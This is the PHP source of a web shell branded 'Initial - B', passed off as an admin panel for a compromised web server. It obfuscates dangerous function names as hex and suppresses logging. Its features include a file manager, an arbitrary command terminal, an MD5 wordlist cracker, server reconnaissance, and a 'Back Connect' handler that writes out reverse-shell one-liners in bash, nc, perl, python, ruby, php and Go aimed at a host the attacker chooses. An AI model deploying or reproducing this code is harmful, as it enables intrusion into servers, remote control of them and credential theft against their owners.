<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '2048M');
session_start();

$key = [
    '676574637764', # ge  tcw d => 0
    '676c6f62', # gl ob => 1
    '69735f646972', # is_d ir => 2
    '69735f66696c65', # is_ file => 3
    '69735f7772697461626c65', # is_wr iteable => 4
    '69735f7265616461626c65', # is_re adble => 5
    '66696c657065726d73', # fileper ms => 6
    '66696c65', # f ile => 7
    '7068705f756e616d65', # php_unam e => 8
    '6765745f63757272656e745f75736572', # getc urrentuser => 9
    '68746d6c7370656369616c6368617273', # html special => 10
    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
    '6d6b646972', # mk dir => 12
    '746f756368', # to uch => 13
    '6368646972', # ch dir => 14
    '72656e616d65', # ren ame => 15
    '65786563', # exe c => 16
    '7061737374687275', # pas sthru => 17
    '73797374656d', # syst em => 18
    '7368656c6c5f65786563', # sh ell_exec => 19
    '706f70656e', # p open => 20
    '70636c6f7365', # pcl ose => 21
    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
    '70726f635f6f70656e', # p roc_open => 23
    '756e6c696e6b', # un link => 24
    '726d646972', # rmd ir => 25
    '666f70656e', # fop en => 26
    '66636c6f7365', # fcl ose => 27
    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
    '63686d6f64', # ch mod => 30
    '7379735f6765745f74656d705f646972', # temp _dir => 31
    '6261736536345F6465636F6465', # => bas e6 4 _decode => 32
    '6261736536345F656E636F6465', # => ba se6 4_ encode => 33
    '7265616c70617468', # => real p ath => 34
    '6469736b5f667265655f7370616365', # => di sk free => 35
    '6469736b5f746f74616c5f7370616365', # => di sk tot => 36
    '7363616e646972', # => sc an dir => 37
    '667772697465', # => fw rite => 38
    '66696c655f657869737473', # => fi le exis => 39
];

$count_key = count($key);
for ($i = 0; $i < $count_key; $i++) {
    $func[] = unx($key[$i]);
}

$ektensi = array(
    'javascript' => ['js', 'vbs', 'java', 'json', 'jsp'],
    'txt' => ['txt', 'log', 'ini', 'rtf', 'yaml', 'yml', 'as', 'asp', 'aspx', 'bak', 'bat', 'bin', 'conf', 'dat', 'css', 'inf', 'sql', 'py', 'lua', 'sh', 'rb', 'pl', 'cfg'],
    'image' => ['png', 'jpg', 'ico', 'jpeg', 'gif', 'bmp', 'jfif', 'jpe', 'tif', 'tiff', 'webp', 'mng', 'heic'],
    'audio' => ['aa', 'aac', 'aax', 'act', 'aiff', 'alac', 'amr', 'ape', 'au', 'awb', 'dss', 'dvf', 'flac', 'gsm', 'iklax', 'ivs', 'm4a', 'm4b', 'mmf', 'movpkg', 'mp3', 'mpc', 'msv', 'nmf', 'oga', 'mogg', 'opus', 'ra', 'rm', 'raw', 'rf64', 'sln', 'tta', 'voc', 'vox', 'wav', 'wma', 'wv', '8svx', 'cda'],
    'video' => ['webm', 'mkv', 'flv', 'vob', 'ogv', 'ogg', 'drc', 'givf', 'mng', 'avi', 'MTS', 'M2TS', 'TS', 'mov', 'qt', 'wmv', 'yuv', 'rm', 'rmvb', 'viv', 'asf', 'amv', 'mp4', 'm4p', 'm4v', 'mpg', 'mpeg', 'm2v', 'm4v', 'svi', '3gp', '3g2', 'mxf', 'roq', 'nsv', 'flv', 'f4v', 'f4p', 'f4a', 'f4b'],
    'html' => ['html', 'htm', 'shtml', 'xhtml', 'xml', 'inc', 'tpl', 'tmpl'],
    'php' => ['php', 'php2', 'php3', 'php4', 'php5', 'php7', 'phtml', 'phps'],
    'ht' => ['htaccess', 'htpasswd', 'ht', 'hta', 'so', 'env'],
    'archive' => ['tar', 'zip', 'rar', 'r00', 'ace', 'arj', 'bz', 'bz2', 'tbz', 'tbz2', 'tgz', 'uu', 'xxe', 'cab', 'gz', 'xz', 'lha', 'lzh', 'pbk', 'uuf', '7z']);

if (isset($_SESSION['path']) && !empty($_SESSION['path'])) {
    $path = $_SESSION['path'];
    @$func[14]($path);
} else {
    $path = @$func[0]();
}

$is_me = $_SERVER['SCRIPT_NAME'];
$home_s = $func[34](dirname(__FILE__));
$dir = @$func[0]();
$dir = str_replace("\\","/",$dir);
$os = strtolower(substr(PHP_OS, 0, 3));
$win = $os == "win";
if($win){
    $garis = "\\";
}else{
    $garis = "/";
}
$D = explode('/', $dir); 
$ip = gethostbyname($_SERVER["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"]);
$kernel = @$func[8]('s');
$fspace = $func[35]("/");
$tspace = $func[36]("/");
$used = $tspace - $fspace;
$hdd_percent = round(($used / $tspace) * 100, 2);
$sm = (@ini_get(strtolower("\x73\x61\x66\x65\x5f\x6d\x6f\x64\x65")) == 'on') ? "<font class=text-primary>ON</font>" : "OFF";
$ds = @ini_get("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73");
$mysql = (function_exists("\x6d\x79\x73\x71\x6c\x69\x5f\x63\x6f\x6e\x6e\x65\x63\x74")) ? "<font class=text-success>ON</font>" : "<font class=text-danger>OFF</font>";
$curl = (function_exists("\x63\x75\x72\x6c\x5f\x76\x65\x72\x73\x69\x6f\x6e")) ? "<font class=text-success>ON</font>" : "<font class=text-danger>OFF</font>";
$wget = (exe('wget --help')) ? "<font class=text-success>ON</font>" : "<font class=text-danger>OFF</font>";
$perl = (exe('perl --help')) ? "<font class=text-success>ON</font>" : "<font class=text-danger>OFF</font>";
$python = (exe('python3 --help')) ? "<font class=text-success>ON</font>" : "<font class=text-danger>OFF</font>";
$software = getenv("\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45");
$home_r = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
$d0mains = @$func[7]("/etc/named.conf");
if($d0mains){
$count;  
foreach($d0mains as $d0main)
{
if(@preg_match("#zone#m",$d0main)){
preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
flush();
$count++;
} 
}
}
}
$count = (empty($count)) ? "0" : $count;
$show_ds = (!empty($ds)) ? "<font class=text-danger>$ds</font>" : "NONE";

if(!function_exists('posix_getegid')) {
    $user = @$func[9]();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}

// Download File
if(isset($_GET['dl']) && !empty($_GET['dl'])){
    $file = $_GET['dl'];
    $filez = @$func[11]($file);
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=".basename($file).";");
   echo $filez; 
    exit; 
}


if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 $aksi = $_POST['aksi'];
 switch ($aksi) {
  case 'upload_file':
  if (isset($_FILES['file'])) {
    $nama_file = $_FILES['file']['name'];
    $tmp_name = $_FILES['file']['tmp_name'];
    $direktori = $dir;

    if ($func[29]($tmp_name, $direktori . "/" . $nama_file)) {
      success("$nama_file Uploaded!");
    } else {
      failed("Failed to upload $nama_file!");
    }
  }
  break;
  case 'simpan_path':
  $path = $_POST['path'];
  $_SESSION['path'] = $path;
  break;
  case 'buka_folder':
  if (!empty($_POST['path'])) {
    $path = $func[34]($_POST['path']);
    $_SESSION['path'] = $path;
    $func[14]($path);
    

    if(!$func[5]($path)) {
            div_head('File Manager');
            echo "<div class='alert alert-danger'<label class=control-label>Directory $path is not readable!</label></div>";
            div_foot();
            exit;
    }

    $sdirs = $func[37]($path);
    // Menampilkan folder
    $folders = array_filter($sdirs, function($dir) use ($path) {
      return $GLOBALS['func'][2]($path . '/' . $dir) && $dir != '.' && $dir != '..';
    });
    
    // Menampilkan file
    $files = array_filter($sdirs, function($file) use ($path) {
      return $GLOBALS['func'][3]($path . '/' . $file);
    });
    
    div_head('File Manager');
    echo '
                                        <div class="table-responsive">
                                        <table class="table table-hover">
                                            <thead>
                                                <tr>
                                                    <th><input class="form-check-input checkbox" type="checkbox" name="selectAll" id="selectAll" onclick="checkAll(this.checked)">&nbsp; Name</th>
                                                    <th><center>Type</center></th>
                                                    <th><center>Size</center></th>
                                                    <th><center>Last Modified</center></th>
                                                    <th><center>Permission</center></th>
                                                    <th><center>Options</center></th>
                                                </tr>
                                            </thead>
                                            <tbody>';
    // Tampilkan folder
    foreach ($folders as $dirx) {
      $ukuran = formatSize(folderSize($path . '/' . $dirx));
      $filePath = $_SESSION['path'] . '/' . $dirx;
      echo '<tr>';
      echo '<td><input class="form-check-input checkbox" type="checkbox" name="check[]" value="'.$dirx.'">&nbsp;
      <i class="fa fa-lg fa-folder-open"></i>
      <label class="control-label">
      <a href="#" id="folder" data-path="' . $filePath . '" onclick="loadFolder(\''. $filePath . '\')">'. shorting($dirx) . '</a></label></td>';
      echo '<td><center>DIR</center></td>';
      echo "<td><center>$ukuran</center></td>";
      echo '<td><center>' . date("d/m/y", filemtime($path . '/' . $dirx)) . '</center></td>';
      echo '<td><center><a href="#" onclick=cmod("'. $dirx . '")>';
                    if($func[4]($dirx)) echo '<font class="text-success">';
                    elseif(!$func[5]($dirx)) echo '<font class="text-primary">';
                    else echo '<font class="text-body">';
                    echo perms($dirx);
                    echo"</a></center></td>";
               echo "<td align='center'>";
                    if($func[4]($dirx) || !$func[5]($dirx)) 
                echo "
                <a title='Rename'href='#' onclick='rename(\"". $dirx . "\")'><i class='fa fa-pencil' name='rename_dir'></i></a>&nbsp;&nbsp;<a title='Delete' href='#' onclick='hapus(\"". $dirx ."\")'><i class='fa fa-trash' name='delete_dir'></i></a></td>
                
                </tr>
                ";
    }
    
    // Tampilkan file
    foreach ($files as $file) {
      $size = formatSize(filesize($path . '/' . $file));
      $ext = pathinfo($file, PATHINFO_EXTENSION);
      $ext = (empty($ext)) ? '-' : $ext;
      echo '<tr>';
      echo "<td><input class='form-check-input checkbox' type='checkbox' name='check[]' value='$file'>&nbsp;"; 
            // PHP File
            if(validasi($ext,$ektensi['php'])){
            echo "
             <i class='fa fa-xl fa-file-code'></i>";
            }
            // HTML File
            elseif(validasi($ext,$ektensi['html'])){
            echo "
             <i class='fa-brands fa-html5 fa-xl'></i>";
            }
            // Image File
            elseif(validasi($ext,$ektensi['image'])){
            echo "
             <i class='fa fa-xl fa-file-image'></i>";
            }
            // TXT File
            elseif(validasi($ext,$ektensi['txt']) or validasi($ext,$ektensi['javascript']) or validasi($ext,$ektensi['ht'])){
            echo "
             <i class='fa fa-xl fa-file-text'></i>";
            }
            // Archive File
            elseif(validasi($ext,$ektensi['archive'])){
                echo "
             <i class='fa fa-xl fa-file-zipper'></i>";
            }
            // Audio File
            elseif(validasi($ext,$ektensi['audio'])){
                echo "
             <i class='fa fa-xl fa-file-audio'></i>";
            }
            // Video File
            elseif(validasi($ext,$ektensi['video'])){
                echo "
             <i class='fa fa-xl fa-file-video'></i>";
            }
            // Unknow File
            else{
            echo "
             <i class='fa fa-xl fa-unknows'></i>";
            }
            if($file == basename($is_me)){
            echo " 
            <a class='text-white' href='#' onclick='edit_file(\"". $file . "\")'>".shorting($file)."</a></td>";
            }
            // Download a File
            elseif(validasi($ext,$ektensi['archive']) or validasi($ext,$ektensi['audio']) or validasi($ext,$ektensi['video'])){
            echo " 
            <a href='#' target='_blank' onclick='dl(\"".$file."\")'>".shorting($file)."</a></td>";
            }else{
            echo " 
            <a href='#' onclick='edit_file(\"". $file . "\")'>".shorting($file)."</a></td>";
            }
      echo "<td style='text-transform: uppercase;'><center>".$ext."</center></td>";
      echo '<td><center>' . $size . '</center></td>';
      echo '<td><center>' . date("d/m/y", filemtime($path . '/' . $file)) . '</center></td>';
      echo "<td><center><a href='#' onclick='cmod(\"". $file . "\")'>";
                    if($func[4]($file)) echo '<font class="text-success">';
                    elseif(!$func[5]($file)) echo '<font class="text-primary">';
                    else echo '<font class="text-body">';
                    echo perms($file);
                    echo"</font></a></center></td>";
      echo "<td align=center>";
                    if($func[4]($file) || !$func[5]($file)) 
      echo "<a title='Edit' href='#' onclick='edit_file(\"". $file . "\")'><i class='fa fa-edit' name='edit_file'></i></a>&nbsp;&nbsp;<a title='Rename' href='#' onclick='rename(\"". $file . "\")'><i class='fa fa-pencil' name='rename'></i></a>&nbsp;&nbsp;";
      if(validasi($ext,$ektensi['archive'])){
      echo "<a title='Unzip' href='#' onclick='unZip(\"". $file ."\")'><i class='fa fa-box-open' name='unzip'></i></a></td>";
      }
      echo '</tr>';
    }
    
    echo '  </tbody>
            </table>
            <select name="action" class="form-select-sm mb-3 bg-secondary text-white rounded" style="width: 100px;">
            <option value="delete">Delete</option>
            <option value="unzip">Unzip</option>
            <option value="zip">Zip</option>
            </select>
            <input type="submit" onclick="multiSelect()" name="submit-action" value=">>" class="btn-primary right">
            </div>';
    div_foot();
  } else {
    div_head('File Manager');
    echo '<div class="alert alert-danger">Directory not specified!</div>';
    div_foot();

  }
  break;
  case 'buat_folder':
  buat_folder($_POST['nama_folder']);
  break;
  case 'buat_file':
  buat_file($_POST['nama_file']);
  break;
  case 'edit_file':
    if (!empty($_POST['isi_file'])) {
        $byte_tersimpan = edit_file($_POST['nama_file'], $_POST['isi_file']);
        if ($byte_tersimpan !== false) {
            success($_POST['nama_file']." edited successfully!");
        } else {
            failed("Failed to edit file!");
        }
    } else {
        tampilkan_form_edit($_POST['nama_file']);
    }
  break;
  case 'hapus_file':
  $nama_file = explode(',', $_POST['nama_file']);
  foreach ($nama_file as $file) {
    $del = $func[34]($_SESSION['path'] . '/' . $file);
    if (hapusin($del) === true) {
        if ($func[2]($del)) {
            success('Folder ' . basename($file) . ' deleted');
        }else{
            success('File ' . basename($file) . ' deleted');
        }
    } else {
      failed('Failed to delete : ' . basename($file));
    }
  }
  break;
  case 'rename':
  $n = $_POST['nama_file'];
  doRename($n);
  break;
  case 'doRename':
  $n = $_POST['nama_file'];
  $rn = $_POST['newname'];
  $r = $func[15]($n, $rn);
  if ($r === false) {
    failed("Failed to rename!");
    } else {
    success("$n renamed to $rn");
    }
  break;
  case 'cmod':
  $n = $_POST['nama_file'];
  doCmod($n);
  break;
  case 'doCmod':
  $perms = 0;
  for($i=strlen($_POST['perms'])-1;$i>=0;--$i)
  $perms += (int)$_POST['perms'][$i]*pow(8, (strlen($_POST['perms'])-$i-1));
  if(!@$func[30]($_POST['nama_file'], $perms))
  failed('Can\'t set permissions!');
  else success('Change Permission Successfully!');
  break;

case 'makezip':
  $nama_file = $_POST['nama_file'];
  $check = $_POST['check'];
  $files = explode(',', $check);
  $zip_path = $_SESSION['path'] . '/' . $nama_file . '.zip';
  if (file_exists($zip_path)) {
    echo 'File zip sudah ada!';
  } else {
    $zip = new ZipArchive();
    if ($zip->open($zip_path, ZipArchive::CREATE) === TRUE) {
      foreach ($files as $file) {
        $filePath = $_SESSION['path'] . '/' . $file;
        if (file_exists($filePath)) {
          if ($func[2]($filePath)) {
            addFolderToZip($zip, $filePath, basename($file) . '/');
          } else {
            $zip->addFile($filePath, basename($file));
          }
        } else {
          failed('File ' . $file . ' doesnt exists!');
          return false;
        }
      }
      $zip->close();
      success("$nama_file.zip created");
    } else {
      failed("Failed to create $nama_file.zip!");
    }
  }
  break;
case 'unziip':
$nama_file = $_POST['nama_file'];
  if (unzip($nama_file, $_SESSION['path'])) {
    success("$nama_file has been extracted");
  } else {
    failed("Failed to extract $nama_file");
  }
break;
case 'cmmd':
  $cmd = $_POST['command'];
  if(!isset($cmd)){
    echo "<script>window.location.href = '?menu=terminal'</script>";
  }
  if(empty($cmd)){
    echo "Please Insert Command!";
  } else {
    print(exe($cmd));
  }
  break;
  case 'terminal':
  div_head('Terminal');
  ?>
    <div class="input-group mb-3">
    <span class="input-group-text" id="basic-addon1">$</span>
    <input type="text" class="form-control text-white" aria-describedby="basic-addon1" required autocomplete='off' id='command' name='command' placeholder="whoami">
    </div>
    <textarea style="max-height: 500px; resize: none;" class="form-control w-100 m-0 text-white" readonly id="cmd_output" is="highlighted-code" cols="80" rows="12" language="shell" tab-size="2" placeholder="press enter to submit"></textarea> 
<script>
    $(document).ready(function() {
    const command = document.getElementById("command");
      if (command) {
        command.addEventListener("keydown", function(e) {
          if (e.key === "Enter") {
            kirimcmd();
            command.value = "";
          }
        });
      }
    });
  </script>
 <?php
  div_foot();
  break; 
  case 'server_info':
  div_head('Server Information');
  ?>
    <div class="form-group text-white">
                                            <p>Server Name : <?php echo $_SERVER['HTTP_HOST']; ?></p>
                                            <?php if($win){
                                            ?>
                                            <p>User : <?php echo '<font color=#07cb79>'.$user.'</font>' ?></p>
                                            <?php } else {
                                            echo "<p>User : <font class=text-success>$user</font> ($uid) Group : <font class=text-success>$group</font> ($gid)</p>";
                                            }
                                            ?>
                                            <p>HDD : <br>
                                            <?php echo "Free Space: " . hdd($fspace);
                                                  echo "<br>Total Space: " . hdd($tspace);
                                                  echo "<br>Used Space: " . hdd($used) . "\n(" .$hdd_percent . "%)";
                                            ?>
                                            </p>

                                            <p>OS : 
                                            <?php echo $kernel; ?></p>

                                            <p>Software:
                                            <?php echo $software; ?></p>
<br>
                                            <p><?php echo "MySQL : $mysql CURL : $curl WGET : $wget Perl : $perl Python : $python"; ?></p>
<br>
                                            <?php 
                                            if($win)
                                            {   ?><p>Drive : <?php echo showDrives(); }?> </p>
                                        </div>
 <?php
  div_foot();                                               
  break;
  case 'decmd5':
  $list = $func[10]($_POST['passlist']);
  $pass = $func[10]($_POST['md5pass']);
  $tung = 0;
  if(!isset($list) || !isset($pass)){
    echo "<script>window.location.href = '?menu=md5dec'</script>";
  }
  if(empty($list) or empty($pass)){
    echo "<div class='alert alert-danger'>Wordlist Path / Password can't be empty!</div>";
  }elseif(!$func[39]($list)) {
    die("<div class='alert alert-danger'>$list Doesn't Exists!</div>");
  } else {
    $readfile = $func[7]($list,FILE_IGNORE_NEW_LINES);
    $tung = 1;
    foreach ($readfile as $w0rd) {
          $lom = md5($w0rd);
            if ($pass == $lom) {
              success("<b>Found!</b><br>Plain Text : $w0rd<br>MD5 : $pass");
              $tung++;
              break;
            }
        }
    
  }
  if($tung == 1) {
              failed("It was not possible to crack $pass");
          }
  break;
  case 'md5dec':
  div_head('MD5 Brute Force');
  ?>
    <div id="form_md5">
                                            Wordlists Path                                     
                                            <input type="text" class="form-control text-white" name="passlist" id="passlist" placeholder="/somepath/folder/wordlists.txt"/>
                                            <br>
                                            MD5 Password                                    
                                            <input type="text" class="form-control text-white" name="md5pass" id="md5pass" placeholder="Your MD5 password"/>    
<br />
<button class="btn btn-primary w-100 m-0" onclick="deMD5();" ><i class="fa fa-unlock"></i> Decrypt</button>
  </div>
  <br>
    <div id="cracked"> 
      </div>
  <?php
  div_foot();
  break;
  case 'text2md5_':
  $txt = $func[10]($_POST['passtext']);
  if(!isset($txt)){
    echo "<script>window.location.href = '?menu=text2md5'</script>";
  }
  if(empty($txt)){
    failed("Please Insert Text!");
  } else {
    foreach (hash_algos() as $v) {

        $r = hash($v, $txt, false);

        success("<b>".strtoupper($v)."</b> : ".$r);

    }
  }
  break;
  case 'text2hash':
  div_head('Text To Hash');
  ?>
<div class="mb-3">
                                            <label class="form-label">Plain Text</label>                                      
                                            <input type="text" class="form-control text-white" name="passtext" id="passtext" placeholder="Your Plain Text Password"/>
</div>
<button class="btn btn-primary w-100 m-0" onclick="text2md5();" ><i class="fa fa-lock"></i> Encrypt</button> 
    <br><br>                   
  <div class="mb-3">
    <div id="output"> 
      </div>
</div>
  <?php
  div_foot();
  break;
  case 'hash_id':
  $txt = $func[10]($_POST['hashid']);
  if(!isset($txt)){
    echo "<script>window.location.href = '?menu=hashid'</script>";
  }
  if(empty($txt)){
    failed("Please Insert Text!");
  } else {
    $id = hashID($txt);
    $id = json_decode($id, TRUE);
    if (isset($id['algorithms'])) {
        success($txt." : ".$id['algorithms'][0]);
    } else {
        failed("Could not identify");
    }
  }
  break;
  case 'hashid':
  div_head('Hash Identification');
  ?>
  <ul class="list-unstyled mb-0">
  <li>This tools is use <a href="https://hashes.com/">hashes.com</a> API.</li>
  <li>Identify and detect unknown hashes using this tool.</li>
  <li>This page will tell you what type of hash a given string is.</li><br>
  <div id="output"> 
  </div>
<div class="mb-3">
<label class="form-label">Encrypted Password</label>
<input type="text" class="form-control text-white" name="hashid" id="hashid" placeholder="Your Encrypted Password"/>
</div>
<button class="btn btn-primary w-100 m-0" onclick="hashid();" ><i class="fa fa-fingerprint"></i> Identification</button> 
  <div class="mb-3">
</div>
  <?php
  div_foot();
  break;
  case 'backcon':
  $h = $_POST['bchost'];
  $p = $_POST['bcport'];
  $o = $_POST['bc'];
  if ($o == "perl") {
        echo exe('perl -e \'use Socket;$i="' . $h . '";$p=' . $p . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $func[16] . '("/bin/sh -i");};\'');
    } else if ($o == "python") {
        echo exe('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $h . '",' . $p . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
    } else if ($o == "ruby") {
        echo exe('ruby -rsocket -e\'f=TCPSocket.open("' . $h . '",' . $p . ').to_i;' . $func[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
    } else if ($o == "bash") {
        echo exe('bash -i >& /dev/tcp/' . $h . '/' . $p . ' 0>&1');
    } else if ($o == "php") {
        echo exe('php -r \'$sock=fsockopen("' . $h . '",' . $p . ');' . $func[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
    } else if ($o == "nc") {
        echo exe('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $h . ' ' . $p . ' >/tmp/f');
    } else if ($o == "sh") {
        echo exe('sh -i >& /dev/tcp/' . $h . '/' . $p . ' 0>&1');
    } else if ($o == "xterm") {
        echo exe('xterm -display ' . $h . ':' . $p);
    } else if ($o == "golang") {
        echo exe('echo \'package main;import"os/' . $func[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $h . ':' . $p . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
    }
  break;
  case 'backconnect':
  div_head('Back Connect');
  ?>     
  <div class="mb-3">
    <div id="output"> 
      </div>
</div>
<div class="mb-3">
                    <form action="" method="post" id="bcon">
                        <select class="form-select mb-3 text-white" name="bc" id="bc">
                            <option value="-">Choose Backconnect</option>
                            <option value="perl">Perl</option>
                            <option value="python">Python</option>
                            <option value="ruby">Ruby</option>
                            <option value="bash">Bash</option>
                            <option value="php">php</option>
                            <option value="nc">nc</option>
                            <option value="sh">sh</option>
                            <option value="xterm">Xterm</option>
                            <option value="golang">Golang</option>
                        </select>
                        <div class="input-group mb-3">
                                <input type="text" id="bchost" class="form-control" placeholder="127.0.0.1" aria-label="IP">
                                <span class="input-group-text">@</span>
                                <input type="text" id="bcport" class="form-control" placeholder="31337" aria-label="Port">
                        </div>
                    </form>
</div>
<button class="btn btn-primary w-100 m-0" onclick="bc();" ><i class="fa fa-code-branch"></i> Back Connect</button>
  <?php
  div_foot();
  break;
  default:
  div_head('404 Not Found');
  ?>
            <center><div class="col-md-6 text-center p-4"><i class="bi bi-exclamation-triangle display-1 text-primary"></i><h1 class="display-1 fw-bold">404</h1><h1 class="mb-4">Page Not Found</h1><p class="mb-4">We’re sorry, the page you have looked for does not exist in this shell!</p><a class="btn btn-primary rounded-pill py-3 px-5" href="#" onclick="loadFolder('<?= $dir?>')">Go Back</a></div></center>
  <?php
  div_foot(); 
  }
 exit;
}
?>

<!DOCTYPE html>
<html>
    
<head>
        <meta charset="utf-8">
        <title>Initial - B WebShell (BETA)</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="Initial - B PHP Web Shell">
        <meta name="author" content="Initial - B">

        <link rel="shortcut icon" href="/favicon.ico">


        <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@500;700&display=swap" rel="stylesheet"> 
    
    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">

    <!-- Libraries Stylesheet -->
    <link href="https://initial-b.web.id/dark/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="https://initial-b.web.id/dark/lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />

    <!-- Customized Bootstrap Stylesheet -->
    <link href="https://initial-b.web.id/dark/css/bootstrap.min.css" rel="stylesheet">

    <!-- Template Stylesheet -->
    <link href="https://initial-b.web.id/dark/css/style.css" rel="stylesheet">
    <style>
        textarea[is="highlighted-code"] { padding: 18px; }
    </style>
</head>

    <body>
<div class="container-fluid position-relative d-flex p-0">
        <!-- Spinner Start -->
        <div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>
        <!-- Spinner End -->


        <!-- Sidebar Start -->
        <div class="sidebar pe-4 pb-3">
            <nav class="navbar bg-secondary navbar-dark">
                <a href="" class="navbar-brand mx-4 mb-3">
                    <h3 class="text-primary"><i class="fa fa-user-secret me-2"></i>Initial - B</h3>
                </a>
                <div class="navbar-nav w-100">
                    <a href="#" onclick="location='<?php echo $_SERVER['PHP_SELF']; ?>';" class="nav-item nav-link active"><i class="fa fa-folder me-2"></i>File Manager</a>
                    <a href="#" onclick="bukaMenu('terminal')" class="nav-item nav-link"><i class="fa fa-terminal me-2"></i>Terminal</a>
                    <div class="nav-item dropdown">
                        <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown"><i class="fa fa-lock me-2"></i>Password Tools</a>
                        <div class="dropdown-menu bg-transparent border-0">
                            <a href="#" onclick="bukaMenu('md5dec')" class="dropdown-item">MD5 Bruteforce</a>
                            <a href="#" onclick="bukaMenu('text2hash')" class="dropdown-item">Text to Hash</a>
                            <a href="#" onclick="bukaMenu('hashid')" class="dropdown-item">Hash Identification</a>
                        </div>
                    </div>
                    <a href="#" onclick="bukaMenu('backconnect')" class="nav-item nav-link"><i class="fa fa-code-branch me-2"></i>Back Connect</a>
                    <a href="#" onclick="bukaMenu('server_info')" class="nav-item nav-link"><i class="fa fa-server me-2"></i>Server Info</a>
                </div>
            </nav>
        </div>
        <!-- Sidebar End -->


        <!-- Content Start -->
        <div class="content">
            <!-- Navbar Start -->
            <nav class="navbar navbar-expand bg-secondary navbar-dark sticky-top px-4 py-0">
                <a href="#" class="sidebar-toggler flex-shrink-0">
                    <i class="fa fa-bars"></i>
                </a>
            </nav>
            <!-- Navbar End -->


            <!-- Short Info Start -->
            <div class="container-fluid pt-3 px-3">
                <div class="row g-4">
                    <div class="col-sm-6 col-xl-3">
                        <div class="bg-secondary rounded d-flex align-items-center justify-content-between p-4">
                            <i class="fa fa-server fa-3x text-primary"></i>
                            <div class="ms-3">
                                <p class="mb-2">Server IP</p>
                                <h6 class="mb-0"><?= $ip; ?></h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-xl-3">
                        <div class="bg-secondary rounded d-flex align-items-center justify-content-between p-4">
                            <i class="fa fa-globe fa-3x text-primary"></i>
                            <div class="ms-3">
                                <p class="mb-2">Your IP</p>
                                <h6 class="mb-0"><?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-xl-3">
                        <div class="bg-secondary rounded d-flex align-items-center justify-content-between p-4">
                            <i class="fa fa-network-wired fa-3x text-primary"></i>
                            <div class="ms-3">
                                <p class="mb-2">Total Domains</p>
                                <h6 class="mb-0"><?= $count; ?></h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-xl-3">
                        <div class="bg-secondary rounded d-flex align-items-center justify-content-between p-4">
                            <i class="fa-brands fa-php fa-3x text-primary"></i>
                            <div class="ms-3">
                                <p class="mb-2">PHP Version</p>
                                <h6 class="mb-0"><?= PHP_VERSION; ?></h6>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Short Info End -->


            <!-- Menu Start -->
            <div class="container-fluid pt-3 px-3">
                <p id='link-dir'>&nbsp; 
                <?php 
                foreach($D as $c_dir => $cdir) { 
                    $filePath = $path;   
                    if ($cdir == '' && $c_dir == 0) {
                    echo "<a href='#'' onclick=loadFolder('/')><i class='fa fa-folder-tree'></i></a>$garis";
                    continue;
                    }
                    if ($cdir == '') continue;
                    echo "<a href ='#' id='separator' data-path='/' onclick=loadFolder('";
                    for($i = 0; $i <= $c_dir; $i++) {
                        echo $D[$i];
                        if($i != $c_dir) {
                        echo "/";
                        }
                    }
                    echo "')>$cdir</a>$garis";   
                }
